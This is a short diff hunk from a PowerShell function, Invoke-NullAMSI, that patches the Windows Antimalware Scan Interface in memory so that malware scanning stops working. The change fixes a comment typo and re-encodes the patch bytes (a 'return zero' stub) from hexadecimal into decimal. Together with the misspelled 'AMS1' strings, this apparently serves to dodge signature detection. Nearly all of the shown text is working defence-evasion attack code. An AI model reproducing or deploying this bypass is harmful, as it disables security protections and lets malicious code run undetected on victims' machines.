@@ -132,9 +132,9 @@ function Invoke-NullAMSI {
     $protect = Get-Delegate $protectAddr @([IntPtr], [UInt32], [UInt32], [UInt32].MakeByRefType()) ([Bool])
     Write-Verbose "[*] Getting $name delegate"
 
-    # Declare varaibles
+    # Declare variables
     $PAGE_EXECUTE_WRITECOPY = 0x00000080
-    $patch = [byte[]] (0xb8, 0x0, 0x00, 0x00, 0x00, 0xC3)
+    $patch = [byte[]] (184, 0, 0, 0, 0, 195)
     $p = 0; $i = 0
 
     Write-Verbose "[*] Calling $4msiInit to recieve a new AMS1 Context"
